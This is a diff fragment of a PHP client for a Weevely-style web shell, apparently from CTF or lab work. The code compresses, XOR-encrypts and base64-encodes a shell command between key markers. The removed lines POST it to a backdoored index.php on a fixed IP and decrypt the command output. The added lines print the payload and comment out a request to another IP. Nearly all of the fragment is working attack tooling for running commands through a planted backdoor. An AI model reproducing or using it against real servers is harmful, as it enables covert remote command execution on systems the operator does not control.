@@ -27,16 +27,17 @@ $payload = base64_encode(x(gzcompress($cmd), $k));
 
 $data = "$kh$payload$kf";
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "http://192.168.1.60:32919/index.php"); 
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$response = curl_exec($ch);
-curl_close($ch);
+printf("构造的payload: %s\n", $data);
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, "http://110.42.47.121:32773/index.php"); 
+// curl_setopt($ch, CURLOPT_POST, 1);
+// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// $response = curl_exec($ch);
+// curl_close($ch);
 
-if (preg_match("/$p$kh(.+)$kf/", $response, $m)) {
-    $result = gzuncompress(x(base64_decode($m[1]), $k));
-    echo "执行结果: \n" . $result . "\n";
-}
+// if (preg_match("/$p$kh(.+)$kf/", $response, $m)) {
+//     $result = gzuncompress(x(base64_decode($m[1]), $k));
+//     echo "执行结果: \n" . $result . "\n";
+// }
 ?>
